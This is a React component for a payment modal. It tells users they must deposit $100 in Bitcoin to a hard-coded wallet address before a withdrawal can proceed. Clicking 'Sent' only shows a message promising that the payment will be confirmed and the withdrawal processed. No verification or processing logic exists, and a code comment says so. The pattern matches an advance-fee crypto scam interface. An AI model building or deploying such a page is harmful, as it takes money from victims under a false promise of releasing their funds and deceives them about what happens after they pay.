import React, { useState } from "react";

export default function PaymentModal({ onClose }) {
  // New state to track if the initial payment details have been "sent"
  const [isConfirming, setIsConfirming] = useState(false);

  function handleSent() {
    // Instead of actual logic, we just change the state to show the confirmation message
    setIsConfirming(true);
    // You could optionally add a small delay here if needed, but instant feedback is often better.
  }

  const handleClose = () => {
    // Reset state and close the modal
    setIsConfirming(false);
    onClose();
  };


  // --- Step 2: Confirmation View ---
  if (isConfirming) {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>Payment Confirmation Received</h3>
          <p>
            Thank you for initiating the transfer.
            **We will confirm your payment shortly** and process your withdrawal.
          </p>
          <div className="btn-group">
            <button onClick={handleClose} className="btn-primary">
              Close
            </button>
          </div>
        </div>
      </div>
    );
  }

  // --- Step 1: Initial Payment Details View ---
  return (
    <div className="modal-overlay">
      <div className="modal">
        <h3>Payment Required</h3>
        <p>
          To proceed with withdrawal, please deposit <b>$100</b> to the BTC wallet below.
        </p>
        <div className="btc-box">
          bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7
        </div>
        <p className="warning"></p>
        <div className="btn-group">
          <button onClick={handleClose}>Cancel</button>
          <button onClick={handleSent} className="btn-primary">
            Sent
          </button>
        </div>
      </div>
    </div>
  );
}
